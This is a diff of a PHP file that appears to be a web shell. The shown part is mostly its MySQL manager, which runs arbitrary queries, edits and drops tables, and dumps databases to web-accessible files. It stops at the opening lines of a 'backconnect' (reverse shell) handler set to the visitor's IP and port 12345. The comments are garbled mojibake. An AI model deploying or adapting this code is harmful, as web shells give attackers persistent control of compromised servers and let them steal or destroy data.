-		$dbform .= "&lt;input type=\"hidden\" id=\"charset\" name=\"charset\" value=\"$charset\" /&gt;\n";
+		$dbform .= "<input type=\"hidden\" id=\"charset\" name=\"charset\" value=\"$charset\" />\n";
 	}
 
 	if ($doing == 'backupmysql' && $saveasfile) {
@@ -821,14 +821,14 @@ elseif ($action == 'mysqladmin') {
 			$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
 			$fp = @fopen($path,'w');
 			if ($fp) {
-				foreach($table as $k =&gt; $v) {
+				foreach($table as $k => $v) {
 					if ($v) {
 						sqldumptable($v, $fp);
 					}
 				}
 				fclose($fp);				
 				$fileurl = str_replace(SA_ROOT,'',$path);
-				m('Database has success backup to &lt;a href="'.$fileurl.'" target="_blank"&gt;'.$path.'&lt;/a&gt;');
+				m('Database has success backup to <a href="'.$fileurl.'" target="_blank">'.$path.'</a>');
 				mysql_close();
 			} else {
 				m('Backup failed');
@@ -837,7 +837,7 @@ elseif ($action == 'mysqladmin') {
 	}
 	if ($insert && $insertsql) {
 		$keystr = $valstr = $tmp = '';
-		foreach($insertsql as $key =&gt; $val) {
+		foreach($insertsql as $key => $val) {
 			if ($val) {
 				$keystr .= $tmp.$key;
 				$valstr .= $tmp."'".addslashes($val)."'";
@@ -851,7 +851,7 @@ elseif ($action == 'mysqladmin') {
 	}
 	if ($update && $insertsql && $base64) {
 		$valstr = $tmp = '';
-		foreach($insertsql as $key =&gt; $val) {
+		foreach($insertsql as $key => $val) {
 			$valstr .= $tmp.$key."='".addslashes($val)."'";
 			$tmp = ',';
 		}
@@ -878,25 +878,25 @@ elseif ($action == 'mysqladmin') {
 		}
 	}
 
-	formhead(array('title'=&gt;'MYSQL Manager'));
+	formhead(array('title'=>'MYSQL Manager'));
 	makehide('action','mysqladmin');
-	p('&lt;p&gt;');
+	p('<p>');
 	p('DBHost:');
-	makeinput(array('name'=&gt;'dbhost','size'=&gt;20,'value'=&gt;$dbhost));
+	makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
 	p(':');
-	makeinput(array('name'=&gt;'dbport','size'=&gt;4,'value'=&gt;$dbport));
+	makeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));
 	p('DBUser:');
-	makeinput(array('name'=&gt;'dbuser','size'=&gt;15,'value'=&gt;$dbuser));
+	makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
 	p('DBPass:');
-	makeinput(array('name'=&gt;'dbpass','size'=&gt;15,'value'=&gt;$dbpass));
+	makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
 	p('DBCharset:');
-	makeselect(array('name'=&gt;'charset','option'=&gt;$charsetdb,'selected'=&gt;$charset,'nokey'=&gt;1));
-	makeinput(array('name'=&gt;'connect','value'=&gt;'Connect','type'=&gt;'submit','class'=&gt;'bt'));
-	p('&lt;/p&gt;');
+	makeselect(array('name'=>'charset','option'=>$charsetdb,'selected'=>$charset,'nokey'=>1));
+	makeinput(array('name'=>'connect','value'=>'Connect','type'=>'submit','class'=>'bt'));
+	p('</p>');
 	formfoot();
 
 	//²Ù×÷¼ÇÂ¼
-	formhead(array('name'=&gt;'recordlist'));
+	formhead(array('name'=>'recordlist'));
 	makehide('doing');
 	makehide('action','mysqladmin');
 	makehide('base64');
@@ -905,7 +905,7 @@ elseif ($action == 'mysqladmin') {
 	formfoot();
 
 	//Ñ¡¶¨Êý¾Ý¿â
-	formhead(array('name'=&gt;'setdbname'));
+	formhead(array('name'=>'setdbname'));
 	makehide('action','mysqladmin');
 	p($dbform);
 	if (!$dbname) {
@@ -914,7 +914,7 @@ elseif ($action == 'mysqladmin') {
 	formfoot();
 
 	//Ñ¡¶¨±í
-	formhead(array('name'=&gt;'settable'));
+	formhead(array('name'=>'settable'));
 	makehide('action','mysqladmin');
 	p($dbform);
 	makehide('tablename');
@@ -935,8 +935,8 @@ elseif ($action == 'mysqladmin') {
 		$mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
 		//»ñÈ¡Êý¾Ý¿âÐÅÏ¢
 		$mysqlver = mysql_get_server_info();
-		p('&lt;p&gt;MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'&lt;/p&gt;');
-		$highver = $mysqlver &gt; '4.1' ? 1 : 0;
+		p('<p>MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');
+		$highver = $mysqlver > '4.1' ? 1 : 0;
 
 		//»ñÈ¡Êý¾Ý¿â
 		$query = q("SHOW DATABASES");
@@ -945,15 +945,15 @@ elseif ($action == 'mysqladmin') {
 		while($db = mysql_fetch_array($query)) {
 			$dbs[$db['Database']] = $db['Database'];
 		}
-		makeselect(array('title'=&gt;'Please select a database:','name'=&gt;'db[]','option'=&gt;$dbs,'selected'=&gt;$dbname,'onchange'=&gt;'moddbname(this.options[this.selectedIndex].value)','newline'=&gt;1));
+		makeselect(array('title'=>'Please select a database:','name'=>'db[]','option'=>$dbs,'selected'=>$dbname,'onchange'=>'moddbname(this.options[this.selectedIndex].value)','newline'=>1));
 		$tabledb = array();
 		if ($dbname) {
-			p('&lt;p&gt;');
-			p('Current dababase: &lt;a href="javascript:moddbname(\''.$dbname.'\');"&gt;'.$dbname.'&lt;/a&gt;');
+			p('<p>');
+			p('Current dababase: <a href="javascript:moddbname(\''.$dbname.'\');">'.$dbname.'</a>');
 			if ($tablename) {
-				p(' | Current Table: &lt;a href="javascript:settable(\''.$tablename.'\');"&gt;'.$tablename.'&lt;/a&gt; [ &lt;a href="javascript:settable(\''.$tablename.'\', \'insert\');"&gt;Insert&lt;/a&gt; | &lt;a href="javascript:settable(\''.$tablename.'\', \'structure\');"&gt;Structure&lt;/a&gt; | &lt;a href="javascript:settable(\''.$tablename.'\', \'drop\');"&gt;Drop&lt;/a&gt; ]');
+				p(' | Current Table: <a href="javascript:settable(\''.$tablename.'\');">'.$tablename.'</a> [ <a href="javascript:settable(\''.$tablename.'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$tablename.'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$tablename.'\', \'drop\');">Drop</a> ]');
 			}
-			p('&lt;/p&gt;');
+			p('</p>');
 			mysql_select_db($dbname);
 
 			$getnumsql = '';
@@ -968,12 +968,12 @@ elseif ($action == 'mysqladmin') {
 				$sql_query = $sql_query." LIMIT $start_limit, $pagenum";
 				$allowedit = 1;
 			}
-			p('&lt;form action="'.$self.'" method="POST"&gt;');
-			p('&lt;p&gt;&lt;table width="200" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td colspan="2"&gt;Run SQL query/queries on database '.$dbname.':&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;"&gt;'.htmlspecialchars($sql_query,ENT_QUOTES).'&lt;/textarea&gt;&lt;/td&gt;&lt;td style="padding:0 5px;"&gt;&lt;input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;');
+			p('<form action="'.$self.'" method="POST">');
+			p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database '.$dbname.':</td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">'.htmlspecialchars($sql_query,ENT_QUOTES).'</textarea></td><td style="padding:0 5px;"><input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /></td></tr></table></p>');
 			makehide('tablename', $tablename);
 			makehide('action','mysqladmin');
 			p($dbform);
-			p('&lt;/form&gt;');
+			p('</form>');
 			if ($tablename || ($runquery && $sql_query)) {
 				if ($doing == 'structure') {
 					$result = q("SHOW FULL COLUMNS FROM $tablename");
@@ -981,32 +981,32 @@ elseif ($action == 'mysqladmin') {
 					while($row = mysql_fetch_array($result)) {
 						$rowdb[] = $row;
 					}
-					p('&lt;h3&gt;Structure&lt;/h3&gt;');
-					p('&lt;table border="0" cellpadding="3" cellspacing="0"&gt;');
-					p('&lt;tr class="head"&gt;');
-					p('&lt;td&gt;Field&lt;/td&gt;');
-					p('&lt;td&gt;Type&lt;/td&gt;');
-					p('&lt;td&gt;Collation&lt;/td&gt;');
-					p('&lt;td&gt;Null&lt;/td&gt;');
-					p('&lt;td&gt;Key&lt;/td&gt;');
-					p('&lt;td&gt;Default&lt;/td&gt;');
-					p('&lt;td&gt;Extra&lt;/td&gt;');
-					p('&lt;td&gt;Privileges&lt;/td&gt;');
-					p('&lt;td&gt;Comment&lt;/td&gt;');
-					p('&lt;/tr&gt;');
+					p('<h3>Structure</h3>');
+					p('<table border="0" cellpadding="3" cellspacing="0">');
+					p('<tr class="head">');
+					p('<td>Field</td>');
+					p('<td>Type</td>');
+					p('<td>Collation</td>');
+					p('<td>Null</td>');
+					p('<td>Key</td>');
+					p('<td>Default</td>');
+					p('<td>Extra</td>');
+					p('<td>Privileges</td>');
+					p('<td>Comment</td>');
+					p('</tr>');
 					foreach ($rowdb as $row) {
 						$thisbg = bg();
-						p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');
-						p('&lt;td&gt;'.$row['Field'].'&lt;/td&gt;');
-						p('&lt;td&gt;'.$row['Type'].'&lt;/td&gt;');
-						p('&lt;td&gt;'.$row['Collation'].'&nbsp;&lt;/td&gt;');
-						p('&lt;td&gt;'.$row['Null'].'&nbsp;&lt;/td&gt;');
-						p('&lt;td&gt;'.$row['Key'].'&nbsp;&lt;/td&gt;');
-						p('&lt;td&gt;'.$row['Default'].'&nbsp;&lt;/td&gt;');
-						p('&lt;td&gt;'.$row['Extra'].'&nbsp;&lt;/td&gt;');
-						p('&lt;td&gt;'.$row['Privileges'].'&nbsp;&lt;/td&gt;');
-						p('&lt;td&gt;'.$row['Comment'].'&nbsp;&lt;/td&gt;');
-						p('&lt;/tr&gt;');
+						p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
+						p('<td>'.$row['Field'].'</td>');
+						p('<td>'.$row['Type'].'</td>');
+						p('<td>'.$row['Collation'].'&nbsp;</td>');
+						p('<td>'.$row['Null'].'&nbsp;</td>');
+						p('<td>'.$row['Key'].'&nbsp;</td>');
+						p('<td>'.$row['Default'].'&nbsp;</td>');
+						p('<td>'.$row['Extra'].'&nbsp;</td>');
+						p('<td>'.$row['Privileges'].'&nbsp;</td>');
+						p('<td>'.$row['Comment'].'&nbsp;</td>');
+						p('</tr>');
 					}
 					tbfoot();
 					$result = q("SHOW INDEX FROM $tablename");
@@ -1014,34 +1014,34 @@ elseif ($action == 'mysqladmin') {
 					while($row = mysql_fetch_array($result)) {
 						$rowdb[] = $row;
 					}
-					p('&lt;h3&gt;Indexes&lt;/h3&gt;');
-					p('&lt;table border="0" cellpadding="3" cellspacing="0"&gt;');
-					p('&lt;tr class="head"&gt;');
-					p('&lt;td&gt;Keyname&lt;/td&gt;');
-					p('&lt;td&gt;Type&lt;/td&gt;');
-					p('&lt;td&gt;Unique&lt;/td&gt;');
-					p('&lt;td&gt;Packed&lt;/td&gt;');
-					p('&lt;td&gt;Seq_in_index&lt;/td&gt;');
-					p('&lt;td&gt;Field&lt;/td&gt;');
-					p('&lt;td&gt;Cardinality&lt;/td&gt;');
-					p('&lt;td&gt;Collation&lt;/td&gt;');
-					p('&lt;td&gt;Null&lt;/td&gt;');
-					p('&lt;td&gt;Comment&lt;/td&gt;');
-					p('&lt;/tr&gt;');
+					p('<h3>Indexes</h3>');
+					p('<table border="0" cellpadding="3" cellspacing="0">');
+					p('<tr class="head">');
+					p('<td>Keyname</td>');
+					p('<td>Type</td>');
+					p('<td>Unique</td>');
+					p('<td>Packed</td>');
+					p('<td>Seq_in_index</td>');
+					p('<td>Field</td>');
+					p('<td>Cardinality</td>');
+					p('<td>Collation</td>');
+					p('<td>Null</td>');
+					p('<td>Comment</td>');
+					p('</tr>');
 					foreach ($rowdb as $row) {
 						$thisbg = bg();
-						p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');
-						p('&lt;td&gt;'.$row['Key_name'].'&lt;/td&gt;');
-						p('&lt;td&gt;'.$row['Index_type'].'&lt;/td&gt;');
-						p('&lt;td&gt;'.($row['Non_unique'] ? 'No' : 'Yes').'&nbsp;&lt;/td&gt;');
-						p('&lt;td&gt;'.($row['Packed'] === null ? 'No' : $row['Packed']).'&nbsp;&lt;/td&gt;');
-						p('&lt;td&gt;'.$row['Seq_in_index'].'&lt;/td&gt;');
-						p('&lt;td&gt;'.$row['Column_name'].($row['Sub_part'] ? '('.$row['Sub_part'].')' : '').'&nbsp;&lt;/td&gt;');
-						p('&lt;td&gt;'.($row['Cardinality'] ? $row['Cardinality'] : 0).'&nbsp;&lt;/td&gt;');
-						p('&lt;td&gt;'.$row['Collation'].'&nbsp;&lt;/td&gt;');
-						p('&lt;td&gt;'.$row['Null'].'&nbsp;&lt;/td&gt;');
-						p('&lt;td&gt;'.$row['Comment'].'&nbsp;&lt;/td&gt;');
-						p('&lt;/tr&gt;');
+						p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
+						p('<td>'.$row['Key_name'].'</td>');
+						p('<td>'.$row['Index_type'].'</td>');
+						p('<td>'.($row['Non_unique'] ? 'No' : 'Yes').'&nbsp;</td>');
+						p('<td>'.($row['Packed'] === null ? 'No' : $row['Packed']).'&nbsp;</td>');
+						p('<td>'.$row['Seq_in_index'].'</td>');
+						p('<td>'.$row['Column_name'].($row['Sub_part'] ? '('.$row['Sub_part'].')' : '').'&nbsp;</td>');
+						p('<td>'.($row['Cardinality'] ? $row['Cardinality'] : 0).'&nbsp;</td>');
+						p('<td>'.$row['Collation'].'&nbsp;</td>');
+						p('<td>'.$row['Null'].'&nbsp;</td>');
+						p('<td>'.$row['Comment'].'&nbsp;</td>');
+						p('</tr>');
 					}
 					tbfoot();
 				} elseif ($doing == 'insert' || $doing == 'edit') {
@@ -1051,18 +1051,18 @@ elseif ($action == 'mysqladmin') {
 					}
 					$rs = array();
 					if ($doing == 'insert') {
-						p('&lt;h2&gt;Insert new line in '.$tablename.' table &raquo;&lt;/h2&gt;');
+						p('<h2>Insert new line in '.$tablename.' table &raquo;</h2>');
 					} else {
-						p('&lt;h2&gt;Update record in '.$tablename.' table &raquo;&lt;/h2&gt;');
+						p('<h2>Update record in '.$tablename.' table &raquo;</h2>');
 						$where = base64_decode($base64);
 						$result = q("SELECT * FROM $tablename WHERE $where LIMIT 1");
 						$rs = mysql_fetch_array($result);
 					}
-					p('&lt;form method="post" action="'.$self.'"&gt;');
+					p('<form method="post" action="'.$self.'">');
 					p($dbform);
 					makehide('action','mysqladmin');
 					makehide('tablename',$tablename);
-					p('&lt;table border="0" cellpadding="3" cellspacing="0"&gt;');
+					p('<table border="0" cellpadding="3" cellspacing="0">');
 					foreach ($rowdb as $row) {
 						if ($rs[$row['Field']]) {
 							$value = htmlspecialchars($rs[$row['Field']]);
@@ -1070,29 +1070,29 @@ elseif ($action == 'mysqladmin') {
 							$value = '';
 						}
 						$thisbg = bg();
-						p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');
+						p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
 						if ($row['Key'] == 'UNI' || $row['Extra'] == 'auto_increment' || $row['Key'] == 'PRI') {
-							p('&lt;td&gt;&lt;b&gt;'.$row['Field'].'&lt;/b&gt;&lt;br /&gt;'.$row['Type'].'&lt;/td&gt;&lt;td&gt;'.$value.'&nbsp;&lt;/td&gt;&lt;/tr&gt;');
+							p('<td><b>'.$row['Field'].'</b><br />'.$row['Type'].'</td><td>'.$value.'&nbsp;</td></tr>');
 						} else {							
-							p('&lt;td&gt;&lt;b&gt;'.$row['Field'].'&lt;/b&gt;&lt;br /&gt;'.$row['Type'].'&lt;/td&gt;&lt;td&gt;&lt;textarea class="area" name="insertsql['.$row['Field'].']" style="width:500px;height:60px;overflow:auto;"&gt;'.$value.'&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;');
+							p('<td><b>'.$row['Field'].'</b><br />'.$row['Type'].'</td><td><textarea class="area" name="insertsql['.$row['Field'].']" style="width:500px;height:60px;overflow:auto;">'.$value.'</textarea></td></tr>');
 						}
 					}
 					if ($doing == 'insert') {
-						p('&lt;tr class="'.bg().'"&gt;&lt;td colspan="2"&gt;&lt;input class="bt" type="submit" name="insert" value="Insert" /&gt;&lt;/td&gt;&lt;/tr&gt;');
+						p('<tr class="'.bg().'"><td colspan="2"><input class="bt" type="submit" name="insert" value="Insert" /></td></tr>');
 					} else {
-						p('&lt;tr class="'.bg().'"&gt;&lt;td colspan="2"&gt;&lt;input class="bt" type="submit" name="update" value="Update" /&gt;&lt;/td&gt;&lt;/tr&gt;');
+						p('<tr class="'.bg().'"><td colspan="2"><input class="bt" type="submit" name="update" value="Update" /></td></tr>');
 						makehide('base64', $base64);
 					}
-					p('&lt;/table&gt;&lt;/form&gt;');
+					p('</table></form>');
 				} else {
 					$querys = @explode(';',$sql_query);
-					foreach($querys as $num=&gt;$query) {
+					foreach($querys as $num=>$query) {
 						if ($query) {
-							p("&lt;p&gt;&lt;b&gt;Query#{$num} : ".htmlspecialchars($query,ENT_QUOTES)."&lt;/b&gt;&lt;/p&gt;");
+							p("<p><b>Query#{$num} : ".htmlspecialchars($query,ENT_QUOTES)."</b></p>");
 							switch(qy($query))
 							{
 								case 0:
-									p('&lt;h2&gt;Error : '.mysql_error().'&lt;/h2&gt;');
+									p('<h2>Error : '.mysql_error().'</h2>');
 									break;	
 								case 1:
 									if (strtolower(substr($query,0,13)) == 'select * from') {
@@ -1129,24 +1129,24 @@ elseif ($action == 'mysqladmin') {
 									$result = q($query);
 
 									p($multipage);
-									p('&lt;table border="0" cellpadding="3" cellspacing="0"&gt;');
-									p('&lt;tr class="head"&gt;');
-									if ($allowedit) p('&lt;td&gt;Action&lt;/td&gt;');
+									p('<table border="0" cellpadding="3" cellspacing="0">');
+									p('<tr class="head">');
+									if ($allowedit) p('<td>Action</td>');
 									$fieldnum = @mysql_num_fields($result);
-									for($i=0;$i&lt;$fieldnum;$i++){
+									for($i=0;$i<$fieldnum;$i++){
 										$name = @mysql_field_name($result, $i);
 										$type = @mysql_field_type($result, $i);
 										$len = @mysql_field_len($result, $i);
-										p("&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '&lt;b&gt; - PRIMARY&lt;/b&gt;' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '&lt;b&gt; - Auto&lt;/b&gt;' : '')."&lt;/span&gt;&lt;/td&gt;");
+										p("<td nowrap>$name<br><span>$type($len)".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '<b> - PRIMARY</b>' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '<b> - Auto</b>' : '')."</span></td>");
 									}
-									p('&lt;/tr&gt;');
+									p('</tr>');
 									
 									while($mn = @mysql_fetch_assoc($result)){
 										$thisbg = bg();
-										p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');
+										p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
 										$where = $tmp = $b1 = '';
 										//Ñ¡È¡Ìõ¼þ×Ö¶ÎÓÃ
-										foreach($mn as $key=&gt;$inside){
+										foreach($mn as $key=>$inside){
 											if ($inside) {
 												//²éÕÒÖ÷¼ü¡¢Î¨Ò»ÊôÐÔ¡¢×Ô¶¯Ôö¼ÓµÄ×Ö¶Î£¬ÕÒµ½¾ÍÍ£Ö¹£¬·ñÔò×éºÏËùÓÐ×Ö¶Î×÷ÎªÌõ¼þ¡£
 												if ($rowdb[$key]['Key'] == 'UNI' || $rowdb[$key]['Extra'] == 'auto_increment' || $rowdb[$key]['Key'] == 'PRI') {
@@ -1158,33 +1158,33 @@ elseif ($action == 'mysqladmin') {
 											}
 										}
 										//¶ÁÈ¡¼ÇÂ¼ÓÃ
-										foreach($mn as $key=&gt;$inside){
-											$b1 .= '&lt;td nowrap&gt;'.html_clean($inside).'&nbsp;&lt;/td&gt;';
+										foreach($mn as $key=>$inside){
+											$b1 .= '<td nowrap>'.html_clean($inside).'&nbsp;</td>';
 										}
 										$where = base64_encode($where);
 
-										if ($allowedit) p('&lt;td nowrap&gt;&lt;a href="javascript:editrecord(\'edit\', \''.$where.'\', \''.$tablename.'\');"&gt;Edit&lt;/a&gt; | &lt;a href="javascript:editrecord(\'del\', \''.$where.'\', \''.$tablename.'\');"&gt;Del&lt;/a&gt;&lt;/td&gt;');
+										if ($allowedit) p('<td nowrap><a href="javascript:editrecord(\'edit\', \''.$where.'\', \''.$tablename.'\');">Edit</a> | <a href="javascript:editrecord(\'del\', \''.$where.'\', \''.$tablename.'\');">Del</a></td>');
 
 										p($b1);
-										p('&lt;/tr&gt;');
+										p('</tr>');
 										unset($b1);
 									}
-									p('&lt;tr class="head"&gt;');
-									if ($allowedit) p('&lt;td&gt;Action&lt;/td&gt;');
+									p('<tr class="head">');
+									if ($allowedit) p('<td>Action</td>');
 									$fieldnum = @mysql_num_fields($result);
-									for($i=0;$i&lt;$fieldnum;$i++){
+									for($i=0;$i<$fieldnum;$i++){
 										$name = @mysql_field_name($result, $i);
 										$type = @mysql_field_type($result, $i);
 										$len = @mysql_field_len($result, $i);
-										p("&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '&lt;b&gt; - PRIMARY&lt;/b&gt;' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '&lt;b&gt; - Auto&lt;/b&gt;' : '')."&lt;/span&gt;&lt;/td&gt;");
+										p("<td nowrap>$name<br><span>$type($len)".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '<b> - PRIMARY</b>' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '<b> - Auto</b>' : '')."</span></td>");
 									}
-									p('&lt;/tr&gt;');
+									p('</tr>');
 									tbfoot();
 									p($multipage);
 									break;
 								case 2:
 									$ar = mysql_affected_rows();
-									p('&lt;h2&gt;affected rows : &lt;b&gt;'.$ar.'&lt;/b&gt;&lt;/h2&gt;');
+									p('<h2>affected rows : <b>'.$ar.'</b></h2>');
 									break;
 							}
 						}
@@ -1203,64 +1203,64 @@ elseif ($action == 'mysqladmin') {
 				}
 				$data_size = sizecount($data_size);
 				unset($table);
-				p('&lt;table border="0" cellpadding="0" cellspacing="0"&gt;');
-				p('&lt;form action="'.$self.'" method="POST"&gt;');
+				p('<table border="0" cellpadding="0" cellspacing="0">');
+				p('<form action="'.$self.'" method="POST">');
 				makehide('action','mysqladmin');
 				p($dbform);
-				p('&lt;tr class="head"&gt;');
-				p('&lt;td width="2%" align="center"&gt;&nbsp;&lt;/td&gt;');
-				p('&lt;td&gt;Name&lt;/td&gt;');
-				p('&lt;td&gt;Rows&lt;/td&gt;');
-				p('&lt;td&gt;Data_length&lt;/td&gt;');
-				p('&lt;td&gt;Create_time&lt;/td&gt;');
-				p('&lt;td&gt;Update_time&lt;/td&gt;');
+				p('<tr class="head">');
+				p('<td width="2%" align="center">&nbsp;</td>');
+				p('<td>Name</td>');
+				p('<td>Rows</td>');
+				p('<td>Data_length</td>');
+				p('<td>Create_time</td>');
+				p('<td>Update_time</td>');
 				if ($highver) {
-					p('&lt;td&gt;Engine&lt;/td&gt;');
-					p('&lt;td&gt;Collation&lt;/td&gt;');
+					p('<td>Engine</td>');
+					p('<td>Collation</td>');
 				}
-				p('&lt;td&gt;Operate&lt;/td&gt;');
-				p('&lt;/tr&gt;');
-				foreach ($tabledb as $key =&gt; $table) {
+				p('<td>Operate</td>');
+				p('</tr>');
+				foreach ($tabledb as $key => $table) {
 					$thisbg = bg();
-					p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');
-					p('&lt;td align="center" width="2%"&gt;&lt;input type="checkbox" name="table[]" value="'.$table['Name'].'" /&gt;&lt;/td&gt;');
-					p('&lt;td&gt;&lt;a href="javascript:settable(\''.$table['Name'].'\');"&gt;'.$table['Name'].'&lt;/a&gt;&lt;/td&gt;');
-					p('&lt;td&gt;'.$table['Rows'].'&lt;/td&gt;');
-					p('&lt;td&gt;'.$table['Data_length'].'&lt;/td&gt;');
-					p('&lt;td&gt;'.$table['Create_time'].'&nbsp;&lt;/td&gt;');
-					p('&lt;td&gt;'.$table['Update_time'].'&nbsp;&lt;/td&gt;');
+					p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
+					p('<td align="center" width="2%"><input type="checkbox" name="table[]" value="'.$table['Name'].'" /></td>');
+					p('<td><a href="javascript:settable(\''.$table['Name'].'\');">'.$table['Name'].'</a></td>');
+					p('<td>'.$table['Rows'].'</td>');
+					p('<td>'.$table['Data_length'].'</td>');
+					p('<td>'.$table['Create_time'].'&nbsp;</td>');
+					p('<td>'.$table['Update_time'].'&nbsp;</td>');
 					if ($highver) {
-						p('&lt;td&gt;'.$table['Engine'].'&lt;/td&gt;');
-						p('&lt;td&gt;'.$table['Collation'].'&lt;/td&gt;');
+						p('<td>'.$table['Engine'].'</td>');
+						p('<td>'.$table['Collation'].'</td>');
 					}
-					p('&lt;td&gt;&lt;a href="javascript:settable(\''.$table['Name'].'\', \'insert\');"&gt;Insert&lt;/a&gt; | &lt;a href="javascript:settable(\''.$table['Name'].'\', \'structure\');"&gt;Structure&lt;/a&gt; | &lt;a href="javascript:settable(\''.$table['Name'].'\', \'drop\');"&gt;Drop&lt;/a&gt;&lt;/td&gt;');
-					p('&lt;/tr&gt;');
+					p('<td><a href="javascript:settable(\''.$table['Name'].'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'drop\');">Drop</a></td>');
+					p('</tr>');
 				}
-				p('&lt;tr class="head"&gt;');
-				p('&lt;td width="2%" align="center"&gt;&lt;input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /&gt;&lt;/td&gt;');
-				p('&lt;td&gt;Name&lt;/td&gt;');
-				p('&lt;td&gt;Rows&lt;/td&gt;');
-				p('&lt;td&gt;Data_length&lt;/td&gt;');
-				p('&lt;td&gt;Create_time&lt;/td&gt;');
-				p('&lt;td&gt;Update_time&lt;/td&gt;');
+				p('<tr class="head">');
+				p('<td width="2%" align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td>');
+				p('<td>Name</td>');
+				p('<td>Rows</td>');
+				p('<td>Data_length</td>');
+				p('<td>Create_time</td>');
+				p('<td>Update_time</td>');
 				if ($highver) {
-					p('&lt;td&gt;Engine&lt;/td&gt;');
-					p('&lt;td&gt;Collation&lt;/td&gt;');
+					p('<td>Engine</td>');
+					p('<td>Collation</td>');
 				}
-				p('&lt;td&gt;Operate&lt;/td&gt;');
-				p('&lt;/tr&gt;');
-				p('&lt;tr class='.bg().'&gt;');
-				p('&lt;td&gt;&nbsp;&lt;/td&gt;');
-				p('&lt;td&gt;Total tables: '.$table_num.'&lt;/td&gt;');
-				p('&lt;td&gt;'.$table_rows.'&lt;/td&gt;');
-				p('&lt;td&gt;'.$data_size.'&lt;/td&gt;');
-				p('&lt;td colspan="'.($highver ? 5 : 3).'"&gt;&nbsp;&lt;/td&gt;');
-				p('&lt;/tr&gt;');
+				p('<td>Operate</td>');
+				p('</tr>');
+				p('<tr class='.bg().'>');
+				p('<td>&nbsp;</td>');
+				p('<td>Total tables: '.$table_num.'</td>');
+				p('<td>'.$table_rows.'</td>');
+				p('<td>'.$data_size.'</td>');
+				p('<td colspan="'.($highver ? 5 : 3).'">&nbsp;</td>');
+				p('</tr>');
 
-				p("&lt;tr class=\"".bg()."\"&gt;&lt;td colspan=\"".($highver ? 9 : 7)."\"&gt;&lt;input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /&gt; Save as file &lt;input class=\"input\" name=\"path\" value=\"".SA_ROOT.$dbname.".sql\" type=\"text\" size=\"60\" /&gt; &lt;input class=\"bt\" type=\"submit\" value=\"Export selection table\" /&gt;&lt;/td&gt;&lt;/tr&gt;");
+				p("<tr class=\"".bg()."\"><td colspan=\"".($highver ? 9 : 7)."\"><input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /> Save as file <input class=\"input\" name=\"path\" value=\"".SA_ROOT.$dbname.".sql\" type=\"text\" size=\"60\" /> <input class=\"bt\" type=\"submit\" value=\"Export selection table\" /></td></tr>");
 				makehide('doing','backupmysql');
 				formfoot();
-				p("&lt;/table&gt;");
+				p("</table>");
 				fr($query);
 			}
 		}
@@ -1272,7 +1272,7 @@ elseif ($action == 'mysqladmin') {
 elseif ($action == 'backconnect') {
 	!$yourip && $yourip = $_SERVER['REMOTE_ADDR'];
 	!$yourport && $yourport = '12345';
-	$usedb = array('perl'=&gt;'perl','c'=&gt;'c');
+	$usedb = array('perl'=>'perl','c'=>'c');
 
